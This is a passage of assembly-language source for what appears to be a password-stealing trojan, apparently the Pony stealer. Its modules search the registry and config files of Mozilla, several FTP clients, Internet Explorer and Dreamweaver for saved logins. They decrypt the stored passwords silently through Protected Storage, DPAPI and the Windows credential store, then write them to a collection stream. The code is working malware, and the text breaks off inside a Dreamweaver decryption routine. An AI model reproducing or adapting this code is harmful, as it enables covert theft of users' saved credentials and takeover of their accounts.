IFDEF COMPILE_MODULE_MOZILLA

.data
	szMozillaSuite			db	'Mozilla',0
	szMozillaSuiteBaseRegPath 	db	'\Mozilla\Profiles\',0

.code

GrabMozilla proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	szCurPath[MAX_PATH+1]: BYTE

	invoke	StreamWriteModuleHeader, stream, MODULE_MOZILLA, 0
	mov	hdr_ofs, eax

	mov mozilla_mode, MOZILLA_MODE_FTP_HTTP
	invoke	GetCurrentDirectory, MAX_PATH, addr szCurPath
	invoke	MozillaScanRegProfilePaths, stream, dwCurrentUserKey, offset szMozillaBaseRegPath, offset szMozillaSuite, offset szMozillaSuiteBaseRegPath
	invoke	MozillaScanRegProfilePaths, stream, HKEY_LOCAL_MACHINE, offset szMozillaBaseRegPath, offset szMozillaSuite, offset szMozillaSuiteBaseRegPath
	invoke	SetCurrentDirectory, addr szCurPath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabMozilla endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; LeechFTP 1.3
; http://www.leechftp.org/
; Tested: Version 1.3 (Build 1.3.1.207)
; SFTP: not supported

IFDEF COMPILE_MODULE_LEECHFTP

.data
	szLeechFTPBaseRegPath		db	'Software\LeechFTP',0
	szLeechFTPRegValue1		db	'AppDir',0
	szLeechFTPRegValue2		db	'LocalDir',0	
	szLeechFTPBookmarkFile		db	'bookmark.dat',0
	
.code

GrabLeechFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_LEECHFTP, 0
	mov	hdr_ofs, eax

	invoke	RegReadValueStr, dwCurrentUserKey, offset szLeechFTPBaseRegPath, offset szLeechFTPRegValue1, NULL
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset szLeechFTPBookmarkFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF
	invoke	RegReadValueStr, dwCurrentUserKey, offset szLeechFTPBaseRegPath, offset szLeechFTPRegValue2, NULL
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset szLeechFTPBookmarkFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabLeechFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Odin Secure FTP Expert
; http://www.odinshare.com/secure-ftp-expert.html
; Tested: Version 6.5.3 
; Tested: Version 7.6.3
; SFTP: not supported

IFDEF COMPILE_MODULE_ODIN

.data
	szOdinConfigFile		db	'SiteInfo.QFP',0
	szOdinInstName			db	'Odin',0
	
.code

GrabOdin proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_ODIN, 0
	mov	hdr_ofs, eax

	invoke	SHGetFolderPathStr, CSIDL_DESKTOP
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset szOdinConfigFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF
	
	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset szOdinInstName
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset szOdinConfigFile, ITEMHDR_ID or 0 
			call	MemFree
		.ENDIF
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabOdin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; WinFTP
; Tested: WinFTP 1.6.8
; SFTP: not supported

IFDEF COMPILE_MODULE_WINFTP

.data
	szWinFTPConfigFile		db	'Favorites.dat',0
	szWinFTPInstName		db	'WinFTP',0
	
.code

GrabWinFTP proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_WINFTP, 0
	mov	hdr_ofs, eax

	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset szWinFTPInstName
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset szWinFTPConfigFile, ITEMHDR_ID or 0 
			call	MemFree
		.ENDIF
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWinFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTP Surfer 1.0.7
; http://www.whispertech.com/
; Tested: FTP Surfer 1.0.7
; SFTP: not supported

IFDEF COMPILE_MODULE_FTP_SURFER

.data
	szFTPSurferConfigFile		db	'sites.db',0
	szFTPSurferRegPath		db	'CLSID\{11C1D741-A95B-11d2-8A80-0080ADB32FF4}\InProcServer32',0
	
.code

GrabFTPSurfer proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTP_SURFER, 0
	mov	hdr_ofs, eax

	invoke	RegReadValueStr, HKEY_CLASSES_ROOT, offset szFTPSurferRegPath, NULL, NULL
	.IF	eax
		invoke	ExtractFilePath, eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset szFTPSurferConfigFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPSurfer endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTPGetter 3
; http://www.ftpgetter.com/
; Tested: Version 3.69.0.21
; Tested: Version 3.77.0.17
; SFTP: implemented

IFDEF COMPILE_MODULE_FTPGETTER

.data
	CFTPGetterConfigFile		db	'servers.xml',0
	CFTPGetterAppDataDir		db	'\FTPGetter',0
	
.code

GrabFTPGetter proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTPGETTER, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CFTPGetterAppDataDir, offset CFTPGetterConfigFile, ITEMHDR_ID or 0
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPGetter endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; ALFTP 5
; http://www.altools.com/ALTools/ALFTP.aspx
; Tested: Version 4.11 Beta 1
; Tested: Version 5.20.0.4
; SFTP: implemented

IFDEF COMPILE_MODULE_ALFTP

.data
	CALFTPConfigFile		db	'ESTdb2.dat',0
	CALFTPQuickConfigFile	db	'QData.dat',0
	CALFTPAppDataDir		db	'\Estsoft\ALFTP',0
	
.code

GrabALFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_ALFTP, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CALFTPAppDataDir, offset CALFTPConfigFile, ITEMHDR_ID or 0
	invoke	AppDataCommonFileScan, stream, offset CALFTPAppDataDir, offset CALFTPQuickConfigFile, ITEMHDR_ID or 0
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabALFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; IE 4-9
; Tested: Version 9.0.8112.16421 (9.0.6)
; SFTP: not supported

IFDEF COMPILE_MODULE_IE
	COMPILE_PS_READER	equ	1
ENDIF

IFDEF COMPILE_MODULE_OUTLOOK
	IFDEF GRAB_EMAIL
		COMPILE_PS_READER	equ	1
	ENDIF
ENDIF

IFDEF COMPILE_PS_READER

PST_KEY_CURRENT_USER equ 0      ; Specifies that the storage is maintained in the current user section of the registry.
PST_KEY_LOCAL_MACHINE equ 1     ; Specifies that the storage is maintained in the local machine section of the registry.

; Specifies whether the prompt dialog is shown. This flag is ignored in Windows XP.
PST_PF_ALWAYS_SHOW equ 1        ; Requests that the provider show the prompt dialog to the user even if not required for this access.
PST_PF_NEVER_SHOW equ 2         ; Do not show the prompt dialog to the user.

; IPStore Interface
IPStore struct DWORD
	IPStore_QueryInterface          comethod3       ?
	IPStore_AddRef                  comethod1       ?
	IPStore_Release                 comethod1       ?
	IPStore_GetInfo                 comethod2       ?
	IPStore_GetProvParam            comethod5       ?
	IPStore_SetProvParam            comethod5       ?
	IPStore_CreateType              comethod5       ?
	IPStore_GetTypeInfo             comethod5       ?
	IPStore_DeleteType              comethod4       ?
	IPStore_CreateSubtype           comethod7       ?
	IPStore_GetSubtypeInfo          comethod6       ?
	IPStore_DeleteSubtype           comethod5       ?
	IPStore_ReadAccessRuleset       comethod6       ?
	IPStore_WriteAccessRuleset      comethod6       ?
	IPStore_EnumTypes               comethod4       ?
	IPStore_EnumSubtypes            comethod5       ?
	IPStore_DeleteItem              comethod7       ?
	IPStore_ReadItem                comethod9       ?
	IPStore_WriteItem               comethod10      ?
	IPStore_OpenItem                comethod8       ?
	IPStore_CloseItem               comethod6       ?
	IPStore_EnumItems               comethod6       ?
IPStore ends

; IEnumPStoreTypes/IEnumPStoreItems Interface (there's difference in 
; pointer type of ::Next function only)
IEnumPStoreTypes struct DWORD
	IEnumPStoreTypes_QueryInterface comethod3       ?
	IEnumPStoreTypes_AddRef         comethod1       ?
	IEnumPStoreTypes_Release        comethod1       ?
	IEnumPStoreTypes_Next           comethod4       ?
	IEnumPStoreTypes_Skip           comethod2       ?
	IEnumPStoreTypes_Reset          comethod1       ?
	IEnumPStoreTypes_Clone          comethod2       ?
IEnumPStoreTypes ends

; Used while reading item data
_PST_PROMPTINFO struct DWORD
	cbSize                        	DWORD           ?
	dwPromptFlags                   DWORD           ?
	hwndApp                         DWORD           ?
	szPrompt                        DWORD           ?
_PST_PROMPTINFO ends

; Crypt32
CRYPTPROTECT_UI_FORBIDDEN equ 1 ; This flag is used for remote situations where the user interface (UI) is not an option.

DATA_BLOB struct DWORD
	cbData				dd	? ; Data length
	pbData				dd	? ; Pointer to data		
DATA_BLOB ends

; Convert pType GUID to readable string
TypeNameToStr proc pType, lpBuf, ppProvider
	LOCAL   pst: DWORD
        
	coinvoke ppProvider, IPStore, GetTypeInfo, 0, pType, addr pst, 0
	test    eax, eax
	jnz     @ret
        
	mov     edx, pst
	nop
	invoke  WideCharToMultiByte, CP_ACP, 0, dword ptr[edx+4], -1, lpBuf, 1023, NULL, NULL
	nop
	invoke  CoTaskMemFree, pst

@ret:
	ret
TypeNameToStr endp

; Convert pType & pSubtype GUIDs to readable string
SubtypeNameToStr proc pType, pSubtype, lpBuf, ppProvider
	LOCAL   pst: DWORD
        
	coinvoke ppProvider, IPStore, GetSubtypeInfo, 0, pType, pSubtype, addr pst, 0
	test    eax, eax
	jnz     @ret
        
	mov     edx, pst
	nop
	invoke  WideCharToMultiByte, CP_ACP, 0, dword ptr[edx+4], -1, lpBuf, 1023, NULL, NULL
	nop
	invoke  CoTaskMemFree, pst

@ret:
	ret
SubtypeNameToStr endp

ReadPSItems proc uses edi pType, pSubtype, stream, ppProvider, callback
        LOCAL   WSTRBuf[16]: DWORD
        LOCAL	celtfetched: DWORD
        LOCAL   ppEnum: DWORD

        .IF	!callback
        	ret
		.ENDIF

        coinvoke ppProvider, IPStore, EnumItems, 0, pType, pSubtype, 0, addr ppEnum
        test    eax, eax
        jnz     @ret

@loop:
        ; Here should be IEnumPStoreItems, but it is similar to IEnumPStoreTypes
        ; so I do not use it
        mov	celtfetched, 0
        coinvoke ppEnum, IEnumPStoreTypes, Next, 16, addr WSTRBuf, addr celtfetched
        cmp     celtfetched, 0
        jz      @release

        ; Enumerated Items are in WSTRBuf now
        lea     edi, WSTRBuf

@inner_loop:
		push	ppProvider
		push	stream
		push	dword ptr[edi]
		push	pSubtype
		push	pType
		call	callback
        
        ; Free memory
        invoke  CoTaskMemFree, dword ptr[edi]
        
        ; Next entry
        add     edi, 4
        dec     celtfetched
        jnz     @inner_loop

        jmp     @loop

@release:
        ; Release interface
        coinvoke ppEnum, IEnumPStoreTypes, Release

@ret:
        ret
ReadPSItems endp

ReadPSSubtypes proc uses edi pType, stream, ppProvider, callback
        LOCAL   GUIDBuf[16]: GUID
        LOCAL	celtfetched: DWORD
        LOCAL   ppEnum:DWORD

        ; Get IEnumPStoreTypes interface
        coinvoke ppProvider, IPStore, EnumSubtypes, 0, pType, 0, addr ppEnum
        test    eax, eax
        jnz     @ret

@loop:  
		mov	celtfetched, 0
        coinvoke ppEnum, IEnumPStoreTypes, Next, 16, addr GUIDBuf, addr celtfetched
        cmp     celtfetched, 0
        jz      @release

        ; Enumerate subtypes, for each subtype enumerate items
        lea     edi, GUIDBuf 

@inner_loop:
        invoke  ReadPSItems, pType, edi, stream, ppProvider, callback
        
        ; Next entry
        add     edi, sizeof GUID
        dec     celtfetched
        jnz     @inner_loop

        jmp     @loop

@release:
        ; Release interface
        coinvoke ppEnum, IEnumPStoreTypes, Release

@ret:
        ret
ReadPSSubtypes endp

ReadPSTypes proc uses edi stream, ppProvider, callback
		LOCAL	celtfetched: DWORD
        LOCAL   GUIDBuf[16]: GUID
        LOCAL   ppEnum: DWORD

        ; Get IEnumPStoreTypes interface
        coinvoke ppProvider, IPStore, EnumTypes, 0, 0, addr ppEnum
        test    eax, eax
        jnz     @ret
        
@loop:  
		mov	celtfetched, 0
		nop
        coinvoke ppEnum, IEnumPStoreTypes, Next, 16, addr GUIDBuf, addr celtfetched
        nop
        cmp     celtfetched, 0
        nop
        jz      @release

        ; Enumerated types are in GUIDBuf now, for each type enumerate subtypes
        lea     edi, GUIDBuf

@inner_loop:
		nop
        invoke  ReadPSSubtypes, edi, stream, ppProvider, callback
        
        ; Next item
        add     edi, sizeof GUID
        nop
        dec     celtfetched
        nop
        jnz     @inner_loop

        nop
        jmp     @loop

@release:
        ; Release interface
        coinvoke ppEnum, IEnumPStoreTypes, Release

@ret:
        ret
ReadPSTypes endp

ENDIF

IFDEF COMPILE_MODULE_IE

.data
	szPSExplorer 	db	"Internet Explorer",0
	szPSSites	db	"WininetCacheCredentials",0
	szPSFTP		db	"MS IE FTP Passwords",0
	szPSDPAPI	db	"DPAPI: ", 0
	
.code

PSExport proc dwType, lpName, pData, pDataLen, stream
	invoke	StreamWriteDWORD, stream, dwType

	invoke	lstrlenW, lpName
	shl	eax, 1
	add	eax, 2 ;  NULL

	invoke	StreamWriteBinaryString, stream, lpName, eax
	invoke	StreamWriteBinaryString, stream, pData, pDataLen
	ret
PSExport endp

PSExportA proc dwType, lpName, pData, pDataLen, stream
	invoke	StreamWriteDWORD, stream, dwType

	invoke	lstrlenA, lpName
	inc	eax ; NULL

	invoke	StreamWriteBinaryString, stream, lpName, eax
	invoke	StreamWriteBinaryString, stream, pData, pDataLen
	ret
PSExportA endp

ReadPSItemValue proc pType, pSubtype, pItem, stream, ppProvider
	LOCAL   szType[1024]: BYTE
	LOCAL   szItem[1024]: BYTE
	LOCAL   pspi: _PST_PROMPTINFO
	LOCAL   pData, pDataLen: DWORD
	LOCAL	InBlob: DATA_BLOB
	LOCAL	OutBlob: DATA_BLOB
	LOCAL	dwType: DWORD

	; Get readable names, convert them to ANSI strings
	invoke  TypeNameToStr, pType, addr szType, ppProvider
	invoke  WideCharToMultiByte, CP_ACP, 0, pItem, -1, addr szItem, 1023, NULL, NULL
	
	; Set prompt info structure
	mov     pspi.cbSize, sizeof _PST_PROMPTINFO
	mov     pspi.dwPromptFlags, PST_PF_NEVER_SHOW
	mov     pspi.hwndApp, 0
	mov     pspi.szPrompt, 0

	; pData pointer is allocated automaticly and should be freed using 
	; CoTaskMemFree function
	coinvoke ppProvider, IPStore, ReadItem, 0, pType, pSubtype, pItem, addr pDataLen, addr pData, addr pspi, 0
	cmp	pDataLen, 0
	jz	@ret
	cmp	pData, 0
	jz	@ret

	; Protected sites & FTP passwords
	IFDEF	GRAB_HTTP
	mov	dwType, ITEMHDR_ID or 0
	invoke  lstrcmpi, addr szType, offset szPSExplorer
	test	eax, eax
	jz	@scan_item

	mov	dwType, ITEMHDR_ID or 1
	invoke  lstrcmpi, addr szType, offset szPSSites
	test	eax, eax
	jz	@scan_item
	ENDIF

	mov	dwType, ITEMHDR_ID or 2
	invoke  lstrcmpi, addr szType, offset szPSFTP
	test	eax, eax
	jnz	@F
                
@scan_item:
	; Some FTP items are encrypted using DPAPI, decrypt them
	invoke	StrStrI, addr szItem, addr szPSDPAPI
	.IF	eax
		; Check if crypt32.dll was loaded
		cmp	MyCryptUnprotectData, 0
		jz	@F
		
		m2m	InBlob.cbData, pDataLen
		m2m	InBlob.pbData, pData
		
		lea	eax, OutBlob
		push	eax
		push	CRYPTPROTECT_UI_FORBIDDEN
		push	0
		push	0
		push	0
		push	0
		lea	eax, InBlob
		push	eax		
		call	MyCryptUnprotectData
		
		; Export decrypted data (password)
		.IF	eax
			invoke	PSExport, dwType, pItem, OutBlob.pbData, OutBlob.cbData, stream
			invoke	LocalFree, OutBlob.pbData
		.ENDIF
	.ELSE
		invoke	PSExport, dwType, pItem, pData, pDataLen, stream
	.ENDIF

@@:
	invoke  CoTaskMemFree, pData

@ret:
	ret
ReadPSItemValue endp

.data

sCLSID_IUrlHistory	textequ <{03C374A40H, 0BAE4H, 011CFH, \
			{0BFH, 07DH, 000H, 0AAH, 000H, 069H, 046H, 0EEH}}>

sIID_IUrlHistoryStg	textequ <{03C374A41H, 0BAE4H, 011CFH, \
			{0BFH, 07DH, 000H, 0AAH, 000H, 069H, 046H, 0EEH}}>

sIID_IUrlHistoryStg2	textequ <{0AFA0DC11H, 0C313H, 011D0H, \		
			{083H, 01AH, 000H, 0C0H, 04FH, 0D5H, 0AEH, 038H}}>
			
sIID_IEnumSTATURL	textequ <{03C374A42H, 0BAE4H, 011CFH, \
			{0BFH, 07DH, 000H, 0AAH, 000H, 069H, 046H, 0EEH}}>
			
			
DeclareGuid	CLSID_IUrlHistory
DeclareGuid	IID_IUrlHistoryStg
DeclareGuid	IID_IEnumSTATURL

szIE7WideQuestion	db	'?',0,0,0
szIE7HashFmt2 		db	'%02X',0
szIE7RegPath		db	'Software\Microsoft\Internet Explorer\IntelliForms\Storage2',0
szIE7Facebook		db	'h',0,'t',0,'t',0,'p',0,':',0,'/',0,'/',0
					db	'w',0,'w',0,'w',0,'.',0,'f',0,'a',0,'c',0,'e',0,'b',0,'o',0,'o',0,'k',0,'.',0,'c',0,'o',0,'m',0,'/',0,0,0

.code

STATURL struct DWORD
	cbSize		dd	?
	pwcsUrl		dd	?
	pwcsTitle	dd	?
	ftLastVisited	FILETIME <>
	ftLastUpdated	FILETIME <>
	ftExpires	FILETIME <>
	dwFlags		dd	?
STATURL ends

IEnumSTATURL struct DWORD
	IEnumSTATURL_QueryInterface     comethod3       ?
	IEnumSTATURL_AddRef             comethod1       ?
	IEnumSTATURL_Release            comethod1       ?
	IEnumSTATURL_Next           	comethod4       ?
	IEnumSTATURL_Skip           	comethod2       ?
	IEnumSTATURL_Reset          	comethod1       ?
	IEnumSTATURL_Clone          	comethod2       ?
	IEnumSTATURL_SetFilter          comethod3       ?
IEnumSTATURL ends

IUrlHistoryStg struct DWORD
	IUrlHistoryStg_QueryInterface   comethod3       ?
	IUrlHistoryStg_AddRef           comethod1       ?
	IUrlHistoryStg_Release          comethod1       ?
	IUrlHistoryStg_AddUrl           comethod4       ?
	IUrlHistoryStg_DeleteUrl        comethod3       ?
	IUrlHistoryStg_QueryUrl         comethod4       ?
	IUrlHistoryStg_BindToObject     comethod4       ?
	IUrlHistoryStg_EnumUrls         comethod2       ?
IUrlHistoryStg ends

IFDEF	GRAB_HTTP

IE7ProcessUrl proc uses esi stream, wcsURL, repPos
	LOCAL	sha1_hash[20]: BYTE
	LOCAL	format_buf[20]: BYTE
	LOCAL	crc: DWORD
	LOCAL	hash_str: DWORD
	LOCAL	dwDataLen: DWORD
	LOCAL	lpData: DWORD
	LOCAL	InBlob: DATA_BLOB
	LOCAL	OutBlob: DATA_BLOB
	LOCAL	EntropyBlob: DATA_BLOB
	
	invoke	lstrlenW, wcsURL
	.IF	!eax
		ret
	.ENDIF
	
	shl	eax, 1
	add	eax, 2
	
	mov	edx, eax
	invoke	SHA1Data, wcsURL, edx, addr sha1_hash
	
	sub	ecx, ecx
	mov	crc, ecx
	.WHILE	ecx < 20
		movzx	eax, sha1_hash[ecx]
		add	crc, eax
		inc	ecx
	.ENDW

	sub	esi, esi
	mov	hash_str, esi
	.WHILE	esi < 20
		movzx	eax, sha1_hash[esi]
		invoke	wsprintf, addr format_buf, offset szIE7HashFmt2, eax
		invoke	PonyStrCatFreeArg1, hash_str, addr format_buf
		mov	hash_str, eax
		inc	esi
	.ENDW

	and	crc, 0ffh
	invoke	wsprintf, addr format_buf, offset szIE7HashFmt2, crc
	invoke	PonyStrCatFreeArg1, hash_str, addr format_buf
	mov	hash_str, eax

	invoke	RegReadValueStr, dwCurrentUserKey, offset szIE7RegPath, hash_str, addr dwDataLen
	.IF	eax
		mov	lpData, eax
		
		.IF	dwDataLen
			invoke	lstrlenW, wcsURL
			shl	eax, 1
			add	eax, 2 ;  NULL
		
			mov	EntropyBlob.cbData, eax
			m2m	EntropyBlob.pbData, wcsURL
			m2m	InBlob.cbData, dwDataLen
			m2m	InBlob.pbData, lpData
			mov	OutBlob.pbData, 0
			
			.IF	MyCryptUnprotectData
				lea	eax, OutBlob
				push	eax
				push	CRYPTPROTECT_UI_FORBIDDEN
				push	0
				push	0
				lea	eax, EntropyBlob
				push	eax
				push	0
				lea	eax, InBlob
				push	eax
				call	MyCryptUnprotectData
				.IF	eax && OutBlob.pbData
					.IF	repPos
						mov	edx, repPos
						mov	word ptr[edx], '?'
					.ENDIF
					invoke	PSExport, ITEMHDR_ID or 3, wcsURL, OutBlob.pbData, OutBlob.cbData, stream
					invoke	LocalFree, OutBlob.pbData
				.ENDIF
			.ENDIF
		.ENDIF
		invoke	MemFree, lpData 
	.ENDIF
	
	invoke	MemFree, hash_str        
        
	ret
IE7ProcessUrl endp

IE7FindUrls proc stream
	LOCAL	pHistoryStg: DWORD
	LOCAL	pEnum: DWORD
	LOCAL	stat: STATURL
	LOCAL	celtFetched: DWORD
	LOCAL	repPos: DWORD
	
	invoke  CoCreateInstance, offset CLSID_IUrlHistory, NULL, CLSCTX_SERVER, offset IID_IUrlHistoryStg, addr pHistoryStg
	test	eax, eax
	.IF 	SUCCEEDED
		coinvoke pHistoryStg, IUrlHistoryStg, EnumUrls, addr pEnum
		test	eax, eax
		.IF	SUCCEEDED
			.IF	pEnum
				mov	stat.pwcsUrl, NULL
				mov	stat.pwcsTitle, NULL
				mov	stat.cbSize, sizeof(STATURL)
			
			@@:
				mov	celtFetched, 0
				coinvoke pEnum, IEnumSTATURL, Next, 1, addr stat, addr celtFetched
				.IF	eax == S_OK && celtFetched == 1
	        			.IF	stat.pwcsUrl
	        				invoke	StrStrIW, stat.pwcsUrl, offset szIE7WideQuestion
	        				.IF	eax
	        					mov	word ptr[eax], 0
	        					mov	repPos, eax
	        				.ELSE
	        					mov	repPos, 0
	        				.ENDIF

	        				invoke	IE7ProcessUrl, stream, stat.pwcsUrl, repPos
	        				invoke	CoTaskMemFree, stat.pwcsUrl
	        				.IF	stat.pwcsTitle
	        					invoke	CoTaskMemFree, stat.pwcsTitle
	        				.ENDIF
		       			.ENDIF
	        			jmp	@B
	        		.ENDIF
	        		
	        		coinvoke pEnum, IUnknown, Release
	        	.ENDIF
        	.ENDIF
        	coinvoke pHistoryStg, IUnknown, Release
	.ENDIF

	invoke	IE7ProcessUrl, stream, offset szIE7Facebook, 0
	ret
IE7FindUrls endp

ENDIF

.data

szIE7CredEntropyInitialized	dd	0
szIE7CredEntropy		db	'a',0,'b',0,'e',0,'2',0,'8',0,'6',0,'9',0,'f',0,'-',0,'9',0,'b',0,'4',0,'7',0,'-',0
				db	'4',0,'c',0,'d',0,'9',0,'-',0,'a',0,'3',0,'5',0,'8',0,'-',0,'c',0,'2',0,'2',0,'9',0
				db	'0',0,'4',0,'d',0,'b',0,'a',0,'7',0,'f',0,'7',0,0,0
			
szIE7CredStr			db	'Microsoft_WinInet_*',0
szIE7FTP			db	'ftp://',0

.code

IE7ScanCred proc uses esi stream
	LOCAL	pCred: DWORD
	LOCAL	Count: DWORD
	LOCAL	InBlob: DATA_BLOB
	LOCAL	OutBlob: DATA_BLOB
	LOCAL	EntropyBlob: DATA_BLOB
	
	; Initialize Entropy string
	.IF	!szIE7CredEntropyInitialized
		mov	szIE7CredEntropyInitialized, TRUE
		mov	esi, offset szIE7CredEntropy
		.WHILE	word ptr[esi]
			shl	word ptr[esi], 2
			add	esi, 2
		.ENDW
	.ENDIF
	
	.IF	MyCredFree && MyCredEnumerate && MyCryptUnprotectData
		mov	pCred, NULL
		mov	Count, 0
		lea	eax, pCred
		push	eax
		lea	eax, Count
		push	eax
		push	0
		push	offset szIE7CredStr
		call	MyCredEnumerate
		.IF	eax && Count && pCred
			mov	esi, pCred
			.WHILE	Count && dword ptr[esi]
				push	esi
				mov	esi, dword ptr[esi]
				m2m	InBlob.cbData, dword ptr[esi].CREDENTIAL.CredentialBlobSize
				m2m	InBlob.pbData, dword ptr[esi].CREDENTIAL.CredentialBlob
				
				invoke	lstrlenW, offset szIE7CredEntropy
				shl	eax, 1
				add	eax, 2 ;  NULL
			
				mov	EntropyBlob.cbData, eax
				m2m	EntropyBlob.pbData, offset szIE7CredEntropy
				mov	OutBlob.pbData, 0
				
				lea	eax, OutBlob
				push	eax
				push	CRYPTPROTECT_UI_FORBIDDEN
				push	0
				push	0
				lea	eax, EntropyBlob
				push	eax
				push	0
				lea	eax, InBlob
				push	eax
				call	MyCryptUnprotectData
				.IF	eax && OutBlob.pbData
					IFDEF	GRAB_HTTP
						mov	eax, TRUE
					ELSE
						invoke	StrStrI, [esi].CREDENTIAL.TargetName, offset szIE7FTP
					ENDIF
					.IF	eax
						invoke	PSExportA, ITEMHDR_ID or 4, [esi].CREDENTIAL.TargetName, OutBlob.pbData, OutBlob.cbData, stream
					.ENDIF
					invoke	LocalFree, OutBlob.pbData
				.ENDIF
				
				pop	esi
				dec	Count
				add	esi, 4
			.ENDW
			push	pCred
			call	MyCredFree
		.ENDIF
	.ENDIF
	ret
IE7ScanCred endp

GrabIE proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	ppProvider: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_IE, 0
	mov	hdr_ofs, eax

	.IF	MyPStoreCreateInstance
		mov	ppProvider, NULL
		
		; Get interface to IPStore
		sub		eax, eax
		push    eax
		push    eax
		push    eax
		lea     edx, ppProvider
		push    edx
		call    MyPStoreCreateInstance
		
		test	eax, eax
		.IF	!SUCCEEDED
			jmp	@ret
		.ENDIF
		.IF	!ppProvider
			jmp	@ret
		.ENDIF
		
		; Read Protected Storage data
		invoke	ReadPSTypes, stream, ppProvider, offset ReadPSItemValue
		
		; Release interface
		coinvoke ppProvider, IPStore, Release
	.ENDIF
	
@ret:
	IFDEF	GRAB_HTTP
		invoke	IE7FindUrls, stream
	ENDIF
	
	invoke	IE7ScanCred, stream

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabIE endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Dreamweaver CS5
; Tested: Dreamweaver CS5.5
; SFTP: implemented

IFDEF COMPILE_MODULE_DREAMWEAVER

.data
	CDreamweaverBasePath	db	'Software\Adobe\Common',0
	CDreamweaverSiteServers	db	'SiteServers',0
	CDreamweaverHostFmt	db	'SiteServer %d\Host',0
	CDreamweaverUrlFmt	db	'SiteServer %d\WebUrl',0
	CDreamweaverDirFmt	db	'SiteServer %d\Remote Directory',0
	CDreamweaverUserFmt	db	'SiteServer %d-User',0
	CDreamweaverPassFmt	db	'SiteServer %d-User PW',0
	CDreamweaverNameFmt	db	'%s\Keychain',0
	CDreamweaverSFTPFmt	db	'SiteServer %d\SFTP',0
	
.code

DreamweaverDecryptPass proc uses esi edi ebx lpPass, lpdwPasswordLen
	LOCAL	InBlob: DATA_BLOB
	LOCAL	OutBlob: DATA_BLOB

	mov	edx, lpdwPasswordLen
	mov	dword ptr[edx], 0

	invoke	lstrlen, lpPass
	.IF	eax <= 1
